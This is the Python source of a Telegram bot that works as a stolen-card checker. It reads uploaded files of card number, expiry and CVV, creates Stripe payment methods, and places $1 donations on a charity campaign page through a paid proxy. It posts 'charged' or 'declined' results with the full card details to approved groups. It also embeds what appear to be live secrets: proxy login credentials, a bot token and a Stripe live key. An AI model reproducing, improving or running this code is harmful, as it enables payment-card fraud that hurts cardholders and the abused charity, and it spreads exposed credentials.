import requests
import re
import random
import string
import os
import time
import traceback
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import html

proxy = {
    'http': 'http://user-PP_8TM74LBMHH-country-GB:81c9mj0z@sp-pro.porterproxies.com:7000',
    'https': 'http://user-PP_8TM74LBMHH-country-GB:81c9mj0z@sp-pro.porterproxies.com:7000'
}

bot_token = '7687853605:AAFBgE3dsZSWbSmRHDdJGj5QlAN9LqnY3Bc'
approved_groups = ['-1002344438713']
admin_id = 7264211874

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + '@example.com'

def get_current_ip(session):
    try:
        ip_check_url = "https://api.ipify.org?format=json"
        response = session.get(ip_check_url, proxies=proxy, timeout=10)
        return response.json().get('ip', 'Unknown IP')
    except Exception as e:
        print(f"Failed to get IP: {e}")
        return "Unknown IP"

def update_message(context, chat_id, message_id, status, total_cards, current_card, charged_count, declined_count):
    keyboard = []
    if total_cards > 0:
        keyboard.append([InlineKeyboardButton(f"Total Cards: {total_cards}", callback_data="total")])
    if current_card <= total_cards:
        keyboard.append([InlineKeyboardButton(f"Current Card: {current_card}/{total_cards}", callback_data="current")])
    if charged_count > 0:
        keyboard.append([InlineKeyboardButton(f"Charged: {charged_count} ✅️", callback_data="charged")])
    if declined_count > 0:
        keyboard.append([InlineKeyboardButton(f"Declined: {declined_count} 🚫️", callback_data="declined")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=status,
            reply_markup=reply_markup
        )
    except Exception as e:
        print(f"Error updating message: {e}")

def process_credit_card(cc_line, nonce, message_id, context, total_cards, current_card, charged_count, declined_count):
    cc_line = cc_line.strip()
    if not cc_line:
        return charged_count, declined_count

    cc, mm, yy, cvv = cc_line.split("|")

    session = requests.Session()
    user = generate_user_agent()
    acc = generate_random_account()
    current_ip = get_current_ip(session)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user,
    }

    data = f'type=card&billing_details[name]=Test+User&billing_details[email]={acc}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'

    try:
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            proxies=proxy,
            timeout=20
        )

        if response.status_code != 200 or 'id' not in response.json():
            gateway = "Stripe ($1.0)"
            proxy_used = get_current_ip(session)
            message = 'Declined'
            status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message}\n [↯] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
            declined_count += 1
            update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
            time.sleep(2)
            return charged_count, declined_count

        payment_method_id = response.json()['id']

        headers['authority'] = 'needhelped.com'
        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
        headers['referer'] = 'https://js.stripe.com/'

        data = {
            '_charitable_donation_nonce': nonce,
            'campaign_id': '1164',
            'description': 'Donation',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.0',
            'first_name': 'Test',
            'last_name': 'User',
            'email': acc,
            'gateway': 'stripe',
            'stripe_payment_method': payment_method_id,
            'action': 'make_donation',
        }

        response = session.post(
            'https://needhelped.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            proxies=proxy,
            timeout=20
        )

        response_json = response.json()

        if response_json.get("requires_action") and response_json.get("success") and "redirect_to" in response_json:
            gateway = "Stripe ($1.0)"
            proxy_used = get_current_ip(session)
            message = "Completely charged! ✅"
            status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message}\n [↯] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: { gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
            charged_count += 1
            update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
            context.bot.send_message(chat_id=context.chat_data.get('chat_id'), text=status)
            time.sleep(5)
            return charged_count, declined_count

        if response_json.get("success"):
            gateway = "Stripe ($1.0)"
            proxy_used = get_current_ip(session)
            message = "Completely charged! ✅"
            status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message}\n [↯] 𝐆𝐚𝐭𝐞𝘄𝗮𝘆: { gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
            charged_count += 1
            update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
            context.bot.send_message(chat_id=context.chat_data.get('chat_id'), text=status)
            time.sleep(5)
            return charged_count, declined_count

        message = 'Declined'
        gateway = "Stripe ($1.0)"
        status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝐞𝘄𝗮𝘆: {gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {get_current_ip(session)} \n [↯] Dev. @eaeaksh"
        declined_count += 1
        update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
        time.sleep(2)

        return charged_count, declined_count

    except Exception as e:
        gateway = "Stripe ($1.0)"
        proxy_used = get_current_ip(session)
        message = str(e)
        status = f"〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝐞𝘄𝗮𝘆: {gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
        update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
        time.sleep(3)
        return charged_count, declined_count

def process_file(update: Update, context: CallbackContext, file_path: str):
    try:
        chat_id = str(update.message.chat.id)
        keyboard = [
            [InlineKeyboardButton("Refresh", callback_data="refresh")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = context.bot.send_message(
            chat_id=chat_id,
            text="Processing...",
            reply_markup=reply_markup
        )
        message_id = message.message_id

        context.chat_data['chat_id'] = chat_id

        with open(file_path, 'r') as f:
            cc_lines = f.readlines()

        total_cards = len(cc_lines)
        current_card = 0
        charged_count = 0
        declined_count = 0

        initial_session = requests.Session()
        try:
            response = initial_session.get(
                'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
                headers={'user-agent': generate_user_agent()},
                proxies=proxy,
                timeout=20
            )

            response.raise_for_status()

            nonce_match = re.search(r'name="_charitable_donation_nonce" value="([^"]+)"', response.text)
            nonce = nonce_match.group(1) if nonce_match else None

            if not nonce:
                context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="Failed to get nonce.")
                return

            for cc_line in cc_lines:
                current_card += 1
                charged_count, declined_count = process_credit_card(cc_line, nonce, message_id, context, total_cards, current_card, charged_count, declined_count)

        except requests.exceptions.RequestException as e:
            context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=f"Error during initial request: {e}")
        except Exception as e:
            context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=f"An unexpected error occurred: {e}")

    except Exception as e:
        print(f"Error in process_file: {e}")

def handle_message(update: Update, context: CallbackContext):
    chat_id = str(update.message.chat.id)
    message_text = update.message.text

    if update.message.document and chat_id in approved_groups:
        file = update.message.document.get_file()
        file.download("cc.txt")
        context.user_data['file_downloaded'] = True
        context.user_data['last_message'] = update.message
    elif message_text and message_text == "$aksh" and chat_id in approved_groups:
        if context.user_data.get('file_downloaded'):
            for file in os.listdir("."):
                if file.endswith(".txt"):
                    process_file(update, context, file)
                    break
            context.user_data['file_downloaded'] = False
        else:
            update.message.reply_text("No file to process. Send a file and then reply with $aksh")

    elif message_text and message_text == "$aksh" and chat_id not in approved_groups:
        update.message.reply_text("You are not allowed to use this bot.")
    elif update.message.reply_to_message and update.message.reply_to_message.document and message_text == "$aksh" and chat_id in approved_groups:
        file = update.message.reply_to_message.document.get_file()
        file.download("cc.txt")
        process_file(update, context, "cc.txt")
    elif message_text == "/ping":
        update.message.reply_text("Jinda Hu Lawdee Mara nhi")

def handle_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    if query.data == "refresh":
        query.edit_message_text(text="")

def start_bot(context: CallbackContext):
  try:
    context.bot.send_message(chat_id=admin_id, text="Bot started!",parse_mode=ParseMode.HTML)
  except Exception as e:
    print(f"Failed to send startup message: {e}")

def main():
    updater = Updater(bot_token, use_context=True)
    dp = updater.dispatcher
    dp.add_error_handler(error_handler)

    dp.add_handler(CommandHandler("ping", handle_message))
    dp.add_handler(MessageHandler(Filters.document, handle_message))
    dp.add_handler(MessageHandler(Filters.text, handle_message))
    dp.add_handler(CallbackQueryHandler(handle_callback))

    updater.job_queue.run_once(start_bot, 0)

    updater.start_polling()
    updater.idle()

def error_handler(update: object, context: CallbackContext) -> None:
    tb = traceback.format_exc()
    message = (
        f"An exception occurred:\n"
        f"<pre>{html.escape(tb)}</pre>"
    )
    print(message)
    try:
        context.bot.send_message(
            chat_id=admin_id,
            text=message,
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        print(f"Failed to send error message to Telegram: {e}")

if __name__ == '__main__':
    main()